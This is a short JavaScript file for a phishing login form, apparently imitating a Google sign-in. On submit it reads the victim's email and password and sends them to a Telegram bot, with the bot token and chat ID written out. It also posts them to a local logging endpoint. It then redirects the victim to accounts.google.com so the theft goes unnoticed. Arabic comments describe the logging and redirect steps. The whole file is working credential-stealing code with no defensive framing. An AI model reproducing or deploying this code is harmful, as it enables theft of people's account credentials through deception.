document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = Login Attempt:\nEmail: ${email}\nPassword: ${password};

  fetch("https://api.telegram.org/bot7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: "7817453978",
      text: message
    })
  });

  // حفظ في log.txt عبر Vercel Function (اختياري)
  fetch("/api/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, password })
  });

  // تحويل المستخدم للصفحة الرسمية بعد الإرسال
  setTimeout(() => {
    window.location.href = "https://accounts.google.com";
  }, 1000);
});
